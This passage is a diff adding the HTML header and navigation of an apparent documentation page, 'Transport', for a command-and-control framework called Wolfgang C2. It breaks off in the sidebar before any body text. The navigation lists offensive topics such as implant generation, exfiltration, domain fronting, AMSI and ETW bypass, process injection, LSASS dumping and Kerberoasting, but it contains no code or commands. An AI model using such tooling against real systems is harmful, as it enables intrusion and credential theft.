@@ -1,0 +1,2036 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<meta content="Comprehensive documentation for the Wolfgang C2 Framework" name="description"/>
+<link href="../crypto/" rel="prev"/>
+<link href="../modules/" rel="next"/>
+<link href="../../../architecture/transport/" hreflang="pt-BR" rel="alternate"/>
+<link href="./" hreflang="en" rel="alternate"/>
+<link href="../../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.6.1, mkdocs-material-9.7.5" name="generator"/>
+<title>Transport - Wolfgang C2 Framework</title>
+<link href="../../../assets/stylesheets/main.484c7ddc.min.css" rel="stylesheet"/>
+<link href="../../../assets/stylesheets/palette.ab4e12ef.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="purple" data-md-color-primary="deep-purple" data-md-color-scheme="slate" dir="ltr">
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#transports">
+          Skip to content
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header" data-md-component="header">
+<nav aria-label="Header" class="md-header__inner md-grid">
+<a aria-label="Wolfgang C2 Framework" class="md-header__button md-logo" data-md-component="logo" href="../../" title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            Wolfgang C2 Framework
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              Transport
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="slate" id="__palette_0" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="purple" data-md-color-media="" data-md-color-primary="deep-purple" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to dark mode">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
+</label>
+</form>
+<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+<div class="md-header__option">
+<div class="md-select">
+<button aria-label="Select language" class="md-header__button md-icon">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"></path></svg>
+</button>
+<div class="md-select__inner">
+<ul class="md-select__list">
+<li class="md-select__item">
+<a class="md-select__link" href="../../../architecture/transport/" hreflang="pt-BR">
+              Português
+            </a>
+</li>
+<li class="md-select__item">
+<a class="md-select__link" href="./" hreflang="en">
+              English
+            </a>
+</li>
+</ul>
+</div>
+</div>
+</div>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</label>
+<nav aria-label="Search" class="md-search__options">
+<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+</button>
+</nav>
+<div class="md-search__suggest" data-md-component="search-suggest"></div>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Initializing search
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<nav aria-label="Tabs" class="md-tabs" data-md-component="tabs">
+<div class="md-grid">
+<ul class="md-tabs__list">
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../getting-started/">
+          
+  
+  
+    
+  
+  Getting Started
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../operator-guide/">
+          
+  
+  
+    
+  
+  Operator Guide
+
+        </a>
+</li>
+<li class="md-tabs__item md-tabs__item--active">
+<a class="md-tabs__link" href="../">
+          
+  
+  
+    
+  
+  Architecture
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../developer-guide/">
+          
+  
+  
+    
+  
+  Developer Guide
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../tradecraft/">
+          
+  
+  
+    
+  
+  Tradecraft
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../modules/">
+          
+  
+  
+    
+  
+  Module Catalog
+
+        </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../api/">
+          
+  
+  
+    
+  
+  API Reference
+
+        </a>
+</li>
+</ul>
+</div>
+</nav>
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="Wolfgang C2 Framework" class="md-nav__button md-logo" data-md-component="logo" href="../../" title="Wolfgang C2 Framework">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+    Wolfgang C2 Framework
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../">
+<span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../getting-started/">
+<span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Getting Started
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/quickstart/">
+<span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/first-implant/">
+<span class="md-ellipsis">
+    
+  
+    First Implant
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/first-operation/">
+<span class="md-ellipsis">
+    
+  
+    First Operation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../getting-started/next-steps/">
+<span class="md-ellipsis">
+    
+  
+    Next Steps
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../operator-guide/">
+<span class="md-ellipsis">
+    
+  
+    Operator Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Operator Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/server-setup/">
+<span class="md-ellipsis">
+    
+  
+    Server Setup
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/listeners/">
+<span class="md-ellipsis">
+    
+  
+    Listeners
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/implant-generation/">
+<span class="md-ellipsis">
+    
+  
+    Implant Generation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/cli-reference/">
+<span class="md-ellipsis">
+    
+  
+    CLI Reference
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/agent-management/">
+<span class="md-ellipsis">
+    
+  
+    Agent Management
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/task-system/">
+<span class="md-ellipsis">
+    
+  
+    Task System
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/exfiltration/">
+<span class="md-ellipsis">
+    
+  
+    Exfiltration
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/redirectors/">
+<span class="md-ellipsis">
+    
+  
+    Redirectors
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../operator-guide/plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../">
+<span class="md-ellipsis">
+    
+  
+    Architecture
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="true" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Architecture
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../overview/">
+<span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../protocol/">
+<span class="md-ellipsis">
+    
+  
+    Protocol
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../crypto/">
+<span class="md-ellipsis">
+    
+  
+    Cryptography
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    
+  
+    Transport
+  
+
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+<span class="md-ellipsis">
+    
+  
+    Transport
+  
+
+    
+  </span>
+</a>
+<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#abstraccao-de-transport">
+<span class="md-ellipsis">
+      
+        Abstraccao de Transport
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#https-listener">
+<span class="md-ellipsis">
+      
+        HTTPS Listener
+      
+    </span>
+</a>
+<nav aria-label="HTTPS Listener" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#malleable-profile">
+<span class="md-ellipsis">
+      
+        Malleable Profile
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#fluxo-de-requestresponse">
+<span class="md-ellipsis">
+      
+        Fluxo de Request/Response
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#domain-fronting">
+<span class="md-ellipsis">
+      
+        Domain Fronting
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#dns-listener">
+<span class="md-ellipsis">
+      
+        DNS Listener
+      
+    </span>
+</a>
+<nav aria-label="DNS Listener" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#encoding">
+<span class="md-ellipsis">
+      
+        Encoding
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#formato-de-labels">
+<span class="md-ellipsis">
+      
+        Formato de Labels
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#chunking-e-reassembly">
+<span class="md-ellipsis">
+      
+        Chunking e Reassembly
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#respostas-dns">
+<span class="md-ellipsis">
+      
+        Respostas DNS
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#doh-client-dns-over-https">
+<span class="md-ellipsis">
+      
+        DoH Client (DNS-over-HTTPS)
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#websocket-listener">
+<span class="md-ellipsis">
+      
+        WebSocket Listener
+      
+    </span>
+</a>
+<nav aria-label="WebSocket Listener" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#upgrade-e-message-loop">
+<span class="md-ellipsis">
+      
+        Upgrade e Message Loop
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#server-push">
+<span class="md-ellipsis">
+      
+        Server Push
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#gerenciamento-de-conexoes">
+<span class="md-ellipsis">
+      
+        Gerenciamento de Conexoes
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#named-pipe">
+<span class="md-ellipsis">
+      
+        Named Pipe
+      
+    </span>
+</a>
+<nav aria-label="Named Pipe" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#relay-architecture">
+<span class="md-ellipsis">
+      
+        Relay Architecture
+      
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#platform-support">
+<span class="md-ellipsis">
+      
+        Platform Support
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#transport-chain-no-implant">
+<span class="md-ellipsis">
+      
+        Transport Chain no Implant
+      
+    </span>
+</a>
+<nav aria-label="Transport Chain no Implant" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#logica-de-fallback">
+<span class="md-ellipsis">
+      
+        Logica de Fallback
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#veja-tambem">
+<span class="md-ellipsis">
+      
+        Veja tambem
+      
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../modules/">
+<span class="md-ellipsis">
+    
+  
+    Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../storage/">
+<span class="md-ellipsis">
+    
+  
+    Storage
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../auth/">
+<span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../plugins/">
+<span class="md-ellipsis">
+    
+  
+    Plugins
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../implant-internals/">
+<span class="md-ellipsis">
+    
+  
+    Implant Internals
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_5" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../developer-guide/">
+<span class="md-ellipsis">
+    
+  
+    Developer Guide
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_5_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_5">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Developer Guide
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/project-structure/">
+<span class="md-ellipsis">
+    
+  
+    Project Structure
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-modules/">
+<span class="md-ellipsis">
+    
+  
+    Adding Modules
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/adding-transports/">
+<span class="md-ellipsis">
+    
+  
+    Adding Transports
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/plugin-sdk/">
+<span class="md-ellipsis">
+    
+  
+    Plugin SDK
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/testing/">
+<span class="md-ellipsis">
+    
+  
+    Testing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../developer-guide/build-system/">
+<span class="md-ellipsis">
+    
+  
+    Build System
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/">
+<span class="md-ellipsis">
+    
+  
+    Tradecraft
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_6">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Tradecraft
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_2" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/evasion/">
+<span class="md-ellipsis">
+    
+  
+    Evasion
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_2" id="__nav_6_2_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_2">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Evasion
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/amsi-bypass/">
+<span class="md-ellipsis">
+    
+  
+    AMSI Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/etw-bypass/">
+<span class="md-ellipsis">
+    
+  
+    ETW Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sandbox-detection/">
+<span class="md-ellipsis">
+    
+  
+    Sandbox Detection
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/sleep-obfuscation/">
+<span class="md-ellipsis">
+    
+  
+    Sleep Obfuscation
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/direct-syscalls/">
+<span class="md-ellipsis">
+    
+  
+    Direct Syscalls
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/memory-encryption/">
+<span class="md-ellipsis">
+    
+  
+    Memory Encryption
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/evasion/hwbp-bypass/">
+<span class="md-ellipsis">
+    
+  
+    HWBP Bypass
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_3" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/injection/">
+<span class="md-ellipsis">
+    
+  
+    Injection
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_3">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Injection
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/process-hollowing/">
+<span class="md-ellipsis">
+    
+  
+    Process Hollowing
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/earlybird-apc/">
+<span class="md-ellipsis">
+    
+  
+    EarlyBird APC
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/module-stomping/">
+<span class="md-ellipsis">
+    
+  
+    Module Stomping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/injection/reflective-loading/">
+<span class="md-ellipsis">
+    
+  
+    Reflective Loading
+  
+
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_6_4" type="checkbox"/>
+<div class="md-nav__link md-nav__container">
+<a class="md-nav__link" href="../../tradecraft/credential-access/">
+<span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+</a>
+<label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+<span class="md-nav__icon md-icon"></span>
+</label>
+</div>
+<nav aria-expanded="false" aria-labelledby="__nav_6_4_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_6_4">
+<span class="md-nav__icon md-icon"></span>
+            
+  
+    Credential Access
+  
+
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/lsass-dumping/">
+<span class="md-ellipsis">
+    
+  
+    LSASS Dumping
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/registry-hives/">
+<span class="md-ellipsis">
+    
+  
+    Registry Hives
+  
+
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../tradecraft/credential-access/kerberoasting/">
+<span class="md-ellipsis">
+    
+  
+    Kerberoasting
+  
+
+    
